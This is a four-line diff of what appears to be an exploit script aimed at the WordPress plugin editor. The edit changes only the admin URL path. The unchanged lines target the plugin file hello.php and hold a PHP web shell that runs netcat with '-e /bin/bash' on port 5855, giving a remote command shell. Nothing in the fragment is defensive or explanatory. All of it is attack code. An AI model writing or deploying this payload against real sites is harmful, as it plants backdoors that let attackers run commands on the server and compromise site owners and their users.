@@ -1,4 +1,4 @@
-p = '/wordpress/wp-admin/plugin-editor.php?';
+p = '/wp-admin/plugin-editor.php?';
 q = 'file=hello.php';
 s = '<?=`nc localhost 5855 -e /bin/bash`;';
 
